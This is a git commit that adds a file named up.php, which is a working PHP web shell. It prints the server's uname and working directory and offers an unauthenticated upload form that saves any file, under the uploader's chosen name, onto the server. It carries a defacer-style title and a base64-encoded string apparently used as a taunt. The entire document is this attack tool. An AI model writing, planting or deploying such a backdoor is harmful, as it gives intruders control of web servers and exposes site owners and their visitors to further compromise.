32940fb6e8804f34418d568a2cb047fb634b026d
Abid Hasan <6890160+Hasqan@users.noreply.github.com>
2019-08-17 23:58:14 +0600

    Create up.php

---
+++ up.php
@@ -0,0 +1,6 @@
+<?php
+$str = 'Q2h1ZGUgTXVyaSBWaWpheWUgU29yYm90IGtvcmUgS2hh';echo base64_decode($str);
+?>
+<title>Vuln!! patch it Now! Lucifer</title>
+<?php echo 'Lucifer uname'.'<br>'.'uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } 
+?>
